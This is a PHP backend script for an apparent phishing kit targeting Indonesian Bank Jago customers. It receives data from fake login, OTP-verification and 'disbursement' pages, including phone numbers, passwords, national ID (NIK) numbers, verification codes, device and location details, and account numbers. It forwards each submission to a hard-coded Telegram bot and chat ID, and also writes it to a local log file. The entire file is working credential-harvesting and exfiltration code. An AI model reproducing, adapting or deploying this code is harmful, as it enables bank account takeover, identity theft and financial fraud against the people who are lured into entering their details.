<?php
$telegram_chat_id = "6741003817";
$telegram_bot_token = "7719532232:AAEeFLNU117FY_Lx2wM499U-GstKTb_1by8";

function telegram_send_message($token, $chat_id, $text){
	$url = "https://api.telegram.org/bot{$token}/sendMessage";
	$postFields = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
	if(function_exists('curl_version')){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		$result = curl_exec($ch);
		$err = curl_error($ch);
		curl_close($ch);
		if($result === false){
			return ['ok' => false, 'error' => $err];
		}
		$decoded = json_decode($result, true);
		return $decoded ? $decoded : ['ok' => false, 'error' => 'invalid_response'];
	} else {
		$options = [
			'http' => [
				'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
				'method'  => 'POST',
				'content' => http_build_query($postFields),
				'timeout' => 10,
			],
		];
		$context  = stream_context_create($options);
		$result = @file_get_contents($url, false, $context);
		return $result ? json_decode($result, true) : ['ok' => false, 'error' => 'no_transport'];
	}
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	header('Content-Type: application/json; charset=utf-8');
	$body = file_get_contents('php://input');
	$data = json_decode($body, true);

	// debug log incoming request
	$logPath = __DIR__ . '/telegram_debug.log';
	@file_put_contents($logPath, json_encode(['time'=>date('c'),'remote'=>($_SERVER['REMOTE_ADDR']??''),'body'=>$body, 'data'=>$data], JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES) . PHP_EOL, FILE_APPEND);
	if (!$data || !isset($data['action']) || $data['action'] !== 'send_message') {
		http_response_code(400);
		echo json_encode(['ok' => false, 'error' => 'invalid_request']);
		exit;
	}
	$stage = isset($data['stage']) ? $data['stage'] : 'unknown';
	$payload = isset($data['payload']) ? $data['payload'] : [];

	$stageLabelMap = [
		'login' => 'Halaman 1 — Login',
		'verification' => 'Halaman 2 — Kode Verifikasi',
		'verification_resend' => 'Halaman 2 — Kirim Ulang Kode',
		'pencairan' => 'Halaman 3 — Pencairan',
	];

	$fieldLabelMap = [
		'login' => ['phone' => 'Nomor HP', 'password' => 'Password', 'nik' => 'NIK KTP'],
		'verification' => ['code' => 'Kode Verifikasi', 'timer' => 'Timer', 'location' => 'Lokasi', 'device' => 'Nama Perangkat'],
		'verification_resend' => ['timer' => 'Timer'],
		'pencairan' => ['name' => 'Nama Pemilik Rekening', 'account' => 'Nomor Kantong Jago', 'location' => 'Lokasi', 'device' => 'Nama Perangkat'],
	];

	$displayStage = isset($stageLabelMap[$stage]) ? $stageLabelMap[$stage] : ucfirst($stage);

	$text = "<b>🔔 Pengajuan Form</b>\n";
	$text .= "<b>Halaman:</b> " . htmlspecialchars($displayStage) . "\n";
	$text .= "<b>Waktu:</b> " . htmlspecialchars(date('Y-m-d H:i:s')) . "\n\n";

	foreach ($payload as $k => $v) {
		if ($v === '' || $v === null) { continue; }
		$label = isset($fieldLabelMap[$stage][$k]) ? $fieldLabelMap[$stage][$k] : $k;
		$text .= "<b>" . htmlspecialchars($label) . ":</b> " . htmlspecialchars($v) . "\n";
	}
	$res = telegram_send_message($telegram_bot_token, $telegram_chat_id, $text);

	// debug log telegram API response
	@file_put_contents($logPath, json_encode(['time'=>date('c'),'stage'=>$stage,'payload'=>$payload,'telegram_response'=>$res], JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES) . PHP_EOL, FILE_APPEND);

	if ($res && isset($res['ok']) && $res['ok']) {
		echo json_encode(['ok' => true, 'result' => $res['result']]);
	} else {
		http_response_code(502);
		echo json_encode(['ok' => false, 'error' => $res]);
	}
	exit;
}

?>